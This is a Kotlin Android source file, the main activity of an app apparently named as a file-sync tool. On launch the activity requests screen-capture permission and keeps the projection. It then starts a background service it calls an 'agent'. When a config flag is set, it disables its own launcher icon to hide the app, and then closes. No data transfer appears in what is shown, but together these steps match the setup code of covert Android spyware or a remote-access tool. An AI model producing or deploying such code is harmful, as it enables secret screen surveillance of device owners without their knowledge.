package com.georgetech.filesync

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.georgetech.filesync.modules.DisplayHelper

class MainActivity : AppCompatActivity() {

    private val PROJ_CODE = 9002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), PROJ_CODE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PROJ_CODE && resultCode == RESULT_OK && data != null) {
            DisplayHelper.resultCode = resultCode
            DisplayHelper.resultData = data
            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            DisplayHelper.projection = mpm.getMediaProjection(resultCode, data)
        }
        startAgent()
    }

    private fun startAgent() {
        val intent = Intent(this, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        if (Config.HIDE_ICON) {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }

        finish()
    }
}
